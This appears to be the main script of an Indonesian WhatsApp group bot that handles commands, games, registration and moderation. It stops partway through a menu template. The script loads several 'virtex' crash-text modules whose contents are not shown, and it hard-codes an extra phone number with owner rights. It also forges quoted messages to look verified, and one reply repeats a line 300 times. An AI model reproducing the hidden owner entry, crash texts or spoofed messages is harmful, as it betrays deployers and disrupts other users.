/* REEDIT BY REVOER GANZ ,BANYAK YANG GUA REEDIT || ORI : DHANI
 * GUA SEMPURKAN SC INI SAMPE KE AKAR AKAR NYA ,SAMPE GAADA LAGI YANG NAMANYA ERROR
 * BANYAK FITUR LANGKA YANG GUA TAMBAHIN KE SC INI,SEMUA HASIL OTAK GUA SENDIRI
 * GUA NGODING NYA CAPE YA NGENTOD HARGAI JUGA LAH
=================*/

const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const hx = require('hxz-api')
const os = require('os')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpegInstaller = require('@ffmpeg-installer/ffmpeg')
const ffmpeg = require('fluent-ffmpeg')
const simple = require('./lib/simple.js')
const { removeBackgroundFromImageFile } = require('remove.bg')
ffmpeg.setFfmpegPath(ffmpegInstaller.path)
//══════════[ Lib ]══════════//

const { fetchJosn, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))
const apikey = JSON.parse(fs.readFileSync('./setting/apikey.json'))
const { rules } = require('./setting/rules')
const yts = require('yt-search')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const gtts = require('./lib/gtts.js')('id')
//══════════[ Setting ]══════════//


self = setting.self
dhakey = apikey.dhakey
LolKey = apikey.LolKey
hong = apikey.Kuhong
zenz = apikey.ZenZAPi
autoread = setting.autoread
autoketik = setting.autoketik
autovn = setting.autovn
owner = setting.OwnerNumber
botname = setting.BotName
ownername = setting.OwnerName
gaya1 = setting.gaya1
gaya2 = setting.gaya2
const fakeimage = fs.readFileSync ('./media/vanz.jpeg')
const thumb = fs.readFileSync ('./media/thumb.jpeg')

//══════════[ Data Base ]══════════//

const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const _registered = JSON.parse(fs.readFileSync('./database/registered.json'))
const _donasi = JSON.parse(fs.readFileSync('./database/donate.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welcome.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const _nsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
const { help } = require('./lib/help')
const { pirtek } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { danz,virtex } = require('./virtex/pirtek')
const { vapi } = require('./virtex/vapi')
const { virtex6 } = require('./virtex/virtex6')
const { virtex5 } = require('./virtex/virtex5')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
virgam = fs.readFileSync('./media/virgam.jpeg')
const { validmove, setGame } = require("./lib/tictactoe");

//══════════[ WAKTU ]══════════//

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🌌'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🏞'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌅'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat malam 🏙'
}
let _scommand = JSON.parse(fs.readFileSync('./lib/scommand.json'))
const addCmd = (id, command) => {
	const obj = { id: id, chats: command }
	_scommand.push(obj)
	fs.writeFileSync('./lib/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
	let position = null
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return position
	}
}

const getCmd = (id) => {
	let position = null
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			position = i
		}
	})
	if (position !== null) {
		return _scommand[position].chats
	}
}


const checkSCommand = (id) => {
	let status = false
	Object.keys(_scommand).forEach((i) => {
		if (_scommand[i].id === id) {
			status = true
		}
	})
	return status
}



//══════════[ Module Export ]══════════//
		
module.exports = Revoer = async (Revoer, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
    	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
		const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '#'          	
		body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(mek.message[type].fileSha256.toString('base64')) !== null && getCmd(mek.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const txt = mek.message.conversation
		const botNumber = Revoer.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `6285736891082@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		
		let senderr = mek.key.fromMe ? Revoer.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const groupMetadata = isGroup ? await Revoer.groupMetadata(from) : ''.toString
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        m = simple.smsg(Revoer, mek)
        var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
        const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const conts = mek.key.fromMe ? Revoer.user.jid : Revoer.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Revoer.user.name : conts.notify || conts.vname || conts.name || '-'    
		const argss = body.split(/ +/g) 
		const isAntiLink = isGroup ? _antilink.includes(from) : false
		const isWelkom = isGroup ? _welkom.includes(from) : false
		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		const isNsfw = isGroup ? _nsfw.includes(from) : false
		const isOwner = ownerNumber.includes(sender)
		const isMybot = isOwner || mek.key.fromMe
		let bio_nya = await Revoer.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}
			try {
		pporang = await Revoer.getProfilePicture(from)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		Revoer.updatePresence(from,Presence.available)

		Revoer.on('CB:action,,call', async json => {
			const callerId = json[2][0][1].from
				Revoer.sendMessage(callerId, "Kamu Terdeteksi Menelpon Bot! Bot Akan Otomatis Block Kamu Dalam 5 Detik!\n", MessageType.text);	
				Revoer.blockUser(callerId, "add")
			
		})
		
//══════════[ Mess Dll ]══════════//

mess = {
wait: '[❗] Sedang Di Proses,Sabar Dulu Napa',
eror: 'Maaf terjadi kesalahan !!',
success: 'Sukses️',
error: {
stick: 'Itu bukan sticker kak !!',
Iv: 'Link invalid !!'
},
only: {
nsfw: 'Kebelet Ngocog Ya Deck? Fitur Nsfw Sama Atmin Blm Di Aktifin,Coba suruh aktifin dulu',
group: 'Mana Bisa Gitu ,ini Fitur khusus grup !!',
owner: 'Fitur khusus owner om!!',
admin: 'Bukan Admin Jan Sokeras Deck !!',
Badmin: 'Silakan jadikan bot admin dulu !!'
}
}

const math = (teks) => {
return Math.floor(teks)
}
const runtime = function (seconds) {
seconds = Number(seconds);
var d = Math.floor(seconds / (3600 * 24));
var h = Math.floor((seconds % (3600 * 24)) / 3600);
var m = Math.floor((seconds % 3600) / 60);
var s = Math.floor(seconds % 60);
var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
return dDisplay + hDisplay + mDisplay + sDisplay;
};
		
//══════════[ BUTTON ]══════════//

const sendButton = async (from, context, fortext, but, mek) => {
buttonMessages = {
contentText: context,
footerText: fortext,
buttons: but,
headerType: 1
}
Revoer.sendMessage(from, buttonMessages, buttonsMessage, {
quoted: mek
})
}
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Revoer.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Revoer.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
	headerType: 4,
	mimetype : 'image/jpeg'
}
Revoer.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
		}
		/*--------------------[ Tictactoe Game Function ]--------------------*/
		const cmde = budy.toLowerCase().split(" ")[0] || "";
		let arrNum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"];
		if (fs.existsSync(`./lib/tictactoe/db/${from}.json`)) {
			const boardnow = setGame(`${from}`);
			if (budy == "Cex") return reply("why");
			if (
				budy.toLowerCase() == "y" ||
				budy.toLowerCase() == "yes" ||
				budy.toLowerCase() == "ya"
			) {
				if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
					if (boardnow.status)
						return reply(`Game telah dimulai sebelumnya!`);
					const matrix = boardnow._matrix;
					boardnow.status = true;
					fs.writeFileSync(
						`./lib/tictactoe/db/${from}.json`,
						JSON.stringify(boardnow, null, 2)
					);
					const chatAccept = `*🎮 Tictactoe Game 🎳*
                    
❌ : @${boardnow.X}
⭕ : @${boardnow.O}
               
Giliran : @${boardnow.turn == "X" ? boardnow.X : boardnow.O}

     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}

`;
					Revoer.sendMessage(from, chatAccept, MessageType.text, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [
								boardnow.X + "@s.whatsapp.net",
								boardnow.O + "@s.whatsapp.net",
							],
						},
					});
				} else {
					Revoer.sendMessage(
						from,
						`Opsi ini hanya untuk @${boardnow.O} !`,
						MessageType.text, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [boardnow.O + "@s.whatsapp.net"],
						},
					}
					);
				}
			} else if (
				budy.toLowerCase() == "n" ||
				budy.toLowerCase() == "no" ||
				budy.toLowerCase() == "tidak"
			) {
				if (boardnow.O == sender.replace("@s.whatsapp.net", "")) {
					if (boardnow.status)
						return reply(`Game telah dimulai sebelumnya!`);
					fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
					Revoer.sendMessage(
						from,
						`Sayangnya tantangan @${boardnow.X} ditolak ❌😕`,
						MessageType.text, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [boardnow.X + "@s.whatsapp.net"],
						},
					}
					);
				} else {
					Revoer.sendMessage(
						from,
						`Opsi ini hanya untuk @${boardnow.O} !`,
						MessageType.text, {
						quoted: mek,
						contextInfo: {
							mentionedJid: [boardnow.O + "@s.whatsapp.net"],
						},
					}
					);
				}
			}
		}
		if (arrNum.includes(cmde)) {
			const boardnow = setGame(`${from}`);
			if (!boardnow.status) return reply(`Sepertinya lawan anda belum menerima / menolak tantangan.`)
			if (
				(boardnow.turn == "X" ? boardnow.X : boardnow.O) !=
				sender.replace("@s.whatsapp.net", "")
			)
				return;
			const moving = validmove(Number(budy), `${from}`);
			const matrix = moving._matrix;
			if (moving.isWin) {
				if (moving.winner == "SERI") {
					const chatEqual = `*🎮 Tictactoe Game 🎳*
          
Game berakhir seri 😐
`;
					reply(`*🎮 Tictactoe Game 🎳*
          
Game berakhir seri 😐
`);
					fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
					return;
				}
				const winnerJID = moving.winner == "O" ? moving.O : moving.X;
				const looseJID = moving.winner == "O" ? moving.X : moving.O;
				const limWin = Math.floor(Math.random() * 20) + 10;
				const limLoose = Math.floor(Math.random() * 10) + 5;
				const chatWon = `*🎮 Tictactoe Game 🎳*
          
Telah dimenangkan oleh @${winnerJID} 😎👑
`;
				//    giftLimit(winnerJID + "@s.whatsapp.net", limWin);
				//    pushLimit(looseJID + "@s.whatsapp.net", limLoose);
				Revoer.sendMessage(from, chatWon, MessageType.text, {
					quoted: mek,
					contextInfo: {
						mentionedJid: [
							moving.winner == "O" ?
								moving.O + "@s.whatsapp.net" :
								moving.X + "@s.whatsapp.net",
						],
					},
				});
				fs.unlinkSync(`./lib/tictactoe/db/${from}.json`);
			} else {
				const chatMove = `*🎮 Tictactoe Game 🎳*
          
❌ : @${moving.X}
⭕ : @${moving.O}

Giliran : @${moving.turn == "X" ? moving.X : moving.O}


     ${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}
     ${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}
     ${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}


`;
				Revoer.sendMessage(from, chatMove, MessageType.text, {
					quoted: mek,
					contextInfo: {
						mentionedJid: [
							moving.X + "@s.whatsapp.net",
							moving.O + "@s.whatsapp.net",
						],
					},
				});
			}
		}
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Revoer.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Revoer.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Revoer.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Revoer.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

//══════════[ Fake ]══════════//

const listmsg = (from, title, desc, list) => {
let po = Revoer.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "𝗠𝗘𝗡𝗨","footerText": `${tanggal}`,"listType": "SINGLE_SELECT","sections": list}}, {})
return Revoer.relayWAMessage(po, {waitForAck: true})
}
const reply = (teks) => {
Revoer.sendMessage(from, teks, text, {quoted:mek})
}
const sendMess = (hehe, teks) => {
Revoer.sendMessage(hehe, teks, text)
}
const isUrl = (url) => {
return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? Revoer.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Revoer.sendMessage(from, teks.trim(), extendedText, { quoted: fgi, contextInfo: { "mentionedJid": memberr } })
}
const costum = (pesan, tipe, target, target2) => {
Revoer.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
}
		const ftrol = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { orderMessage: { itemCount : 5555, status: 1, surface : 1, message: `${ucapanWaktu} ${pushname}`, orderTitle: `${ucapanWaktu} ${pushname}`, thumbnail: thumb, sellerJid: '0@s.whatsapp.net' }}}
const floc = { key : { participant : '0@s.whatsapp.net' }, message: { liveLocationMessage: { caption: `${ucapanWaktu} ${pushname}`, jpegThumbnail: thumb }}}
const fvid = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) }, message: { "videoMessage": {  "title": `${ucapanWaktu} ${pushname}`, "h": `${ucapanWaktu} ${pushname}`, 'duration': '99999', 'caption': `${ucapanWaktu} ${pushname}`, 'jpegThumbnail': thumb }}}
const fvoc = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289643739077-1613049930@g.us" } : {}) }, message: { "audioMessage": { "mimetype":"audio/ogg; codecs=opus", "seconds": "99999", "ptt": "true" }}}
		const fgi = { key: { fromMe: false, participant: `0@s.whatsapp.net`, hasVerifiedNumber: true, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "videoMessage": { "title": `${ucapanWaktu} ${pushname}`, "h": `${ucapanWaktu} ${pushname}`, 'duration': '99999', 'gifPlayback': 'true', 'caption': `𝙍𝙀𝙑𝙕𝘽𝙊𝙏𝙕 𝙄𝘿 || 𝙑𝙀𝙍𝙄𝙑𝙄𝙀𝘿`, 'jpegThumbnail': thumb }}}
const textImg = (teks) => { return Revoer.sendMessage(from, teks, text, {quoted: fgi, thumbnail: fs.readFileSync('./media/thumb.jpeg')})}
const fakeitem = (teks) => { Revoer.sendMessage(from, teks, text, { quoted: { key:{ fromMe:false, participant:`0@s.whatsapp.net`, ...(from ? { remoteJid :"6289523258649-1604595598@g.us" }: {})},message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync("./media/thumb.jpeg"),"itemCount":9999999999,"status":"INQUIRY","surface":"CATALOG","message": `${ucapanWaktu} ${pushname}`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}},contextInfo: {"forwardingScore":999,"isForwarded":true}, sendEphemeral: true})}

//══════════[ Storage ]══════════//

const sendMediaURL = async(to, url, text="", mids=[]) =>{
if(mids.length > 0){
text = normalizeMention(to, text, mids)
}
const fn = Date.now() / 10000;
const filename = fn.toString()
let mime = ""
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
mime = res.headers['content-type']
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, filename, async function () {
console.log('done');
let media = fs.readFileSync(filename)
let type = mime.split("/")[0]+"Message"
if(mime === "image/gif"){
type = MessageType.video
mime = Mimetype.gif
}
if(mime.split("/")[0] === "audio"){
mime = Mimetype.mp4Audio
}
Revoer.sendMessage(to, media, type, { quoted: fgi, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
fs.unlinkSync(filename)
});
}  

const getRegisteredRandomId = () => {
return _registered[Math.floor(Math.random() * _registered.length)].id
}
const addRegisteredUser = (userid, sender, age, time, serials) => {
const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
_registered.push(obj)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
}
const checkRegisteredUser = (sender) => {
let status = false
Object.keys(_registered).forEach((i) => {
if (_registered[i].id === sender) {
status = true
}
})
return status
		}

		const getSiapaYangDonasi = () => {
			return _donasi[Math.floor(Math.random() * _donasi.length)].id
		}
		const addKangDonasi = (userid, sender, age, time, serials) => {
			const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
			_donasi.push(obj)
			fs.writeFileSync('./database/donate.json', JSON.stringify(_donasi))
		}
		const checkSiapaYangDonasi = (sender) => {
			let status = false
			Object.keys(_donasi).forEach((i) => {
				if (_donasi[i].id === sender) {
					status = true
				}
			})
			return status
		}

		const sendFileFromUrl = async (link, type, options) => {
			hasil = await getBuffer(link)
			Revoer.sendMessage(from, hasil, type, options).catch(e => {
				fetch(link).then((hasil) => {
					Revoer.sendMessage(from, hasil, type, options).catch(e => {
						Revoer.sendMessage(from, { url: link }, type, options).catch(e => {
							reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
							console.log(e)
						})
					})
				})
			})
		}

		
		const fakevn = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`, ...(from ?
					{ remoteJid: "6289643739077-1613049930@g.us" } : {})
			},
			message: {
				"audioMessage": {
					"mimetype": "audio/ogg; codecs=opus",
					"seconds": "999",
					"ptt": "true"
				}
			}
		}
		const isRegistered = checkRegisteredUser(sender)
		const isDonasi = checkSiapaYangDonasi(sender)

const sendButRegis = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1,
};
Revoer.sendMessage(
id,
buttonMessage,
MessageType.buttonsMessage,
options
);
};

const daftar1 = `Hai kak  ${pushname} ,${ucapanWaktu} \n\nKmuh Belum Terdaftar Sebagai User Bot Nich,Daftar Dlu Skuy `
const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak\nJika Button Tidak Muncul Ketik #verify```'
const daftar3 = [{buttonId: `${prefix}verify`,buttonText: {displayText: `REGISTER`,},type: 1,},]

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
		
//══════════[ Grup ]══════════//

const hideTag = async function(from, text){
let anu = await Revoer.groupMetadata(from)
let members = anu.participants
let ane = []
for (let i of members){
ane.push(i.jid)
}
Revoer.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/vanz.jpeg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}
const hideTagKontak = async function(from, nomor, nama){
let vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:Kontak\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
let anu = await Revoer.groupMetadata(from)
let members = anu.participants
let ane = []
for (let i of members){
ane.push(i.jid)
}
Revoer.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {contextInfo: {"mentionedJid": ane}})
}
const sendKontak = (from, nomor, nama) => {
const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + `ORG:Developer ${botname}\n` + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
Revoer.sendMessage(from, { displayname: nama, vcard: vcard}, MessageType.contact, {quoted:mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
}

//══════════[ Antilink & Antivirtex ]══════════//

if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
	if (isGroupAdmins) return
	if (mek.key.fromMe) return
	if (isOwner) return 
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nJangan Send Link Grup Lain Cuy! Gua Kick Luwh`)
setTimeout(() => {
Revoer.groupRemove(from, [kic]).catch((e) => { reply(`JIRLAH ADA YANG NGIRIM LINK,UNTUNG GUA BUKAN ADMIN`) })
}, 0)
}

if (budy.length > 10000) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('🔥PENANGKAL VIRTEX TANDAI TELAH DIBACA🔥\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nJan Sokeras Dek Ngirim Virus Ampas! W Kik Luwh`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Revoer.groupRemove(from, [sender])
}     
if (!m.key.fromMe && !isOwner && bad.includes(messagesD)) {
ano = fs.readFileSync('./media/sticker/toxic.webp')
	Revoer.sendMessage(from, ano, sticker, { quoted: mek })
	const tongsik = fs.readFileSync('./media/toksik.wav')
	Revoer.sendMessage(from, tongsik, audio, { mimetype: 'audio/mp4', ptt: true, quoted: fgi })
}

//══════════[ Dll ]══════════//

if (autoread){
Revoer.chatRead(from, "read")
} else if (autoketik) {
Revoer.updatePresence(from, Presence.composing)
} else if (autovn) {
Revoer.updatePresence(from, Presence.recording)
}

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		if (!isGroup && isCmd) console.log('\x1b[1;31m[ PC\x1b[1;37m ]', '[\x1b[1;32m PRIBADI \x1b[1;37m]', time, color(command), 'from', color(pushname,'yellow'), 'args :', color(args.length))
      //	if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color(budy), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m[ GC\x1b[1;37m ]', '[\x1b[1;32m GROUP \x1b[1;37m]', time, color(command), 'from', color(pushname,'blue'), 'in', color(groupName,'blue'), 'args :', color(args.length))
	//	if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color(budy), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))

		
      	if (!mek.key.fromMe && !isOwner && self === true) return
switch (command) {

//══════════[ FITUR FITURNYA UY ]══════════//

case 'menu':
	case 'help':
		if(mek.key.fromMe) return
		if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: fgi })
		roadpuasa = await fetchJson(`https://api.lolhuman.xyz/api/countdown/02/04/2022?apikey=${LolKey}`)
		roadraya = await fetchJson(`https://api.lolhuman.xyz/api/countdown/03/05/2022?apikey=${LolKey}`)
		timestampe = speed();
		latensie = speed() - timestampe
		const { wa_version, os_version } = Revoer.user.phone
		pemilik = `${owner}@s.whatsapp.net`
		pil =
			`*_${ucapanWaktu} @${senderr.split('@')[0]}_*

\`\`\`❏「 WAKTU INDONESIA 」\`\`\`
${gaya1} *Tanggal* : ${tanggal}
${gaya1} *Wib* : ${time}
${gaya1} *Wita* : ${timeMak}
${gaya1} *Wit* : ${timeJay}

𝙍𝙤𝙖𝙙 𝙏𝙤 𝙍𝙖𝙢𝙖𝙙𝙝𝙖𝙣 : ${roadpuasa.result}
𝙍𝙤𝙖𝙙 𝙏𝙤 𝙀𝙞𝙙 𝙁𝙞𝙩𝙧𝙞 : ${roadraya.result}

\`\`\`❏「 INFO BOT 」\`\`\`
${gaya1} *Speed* : ${latensie.toFixed(4)} Detik
${gaya1} *Runtime* : ${runtime(process.uptime())}
${gaya1} *Nama Bot* : ${botname}
${gaya1} *Nama Owner* : ${ownername}
${gaya1} *Nomor Owner* : @${pemilik.split('@')[0]}
${gaya1} *Hostname :* ${os.hostname()}
${gaya1} *Platform :* ${os.platform()}
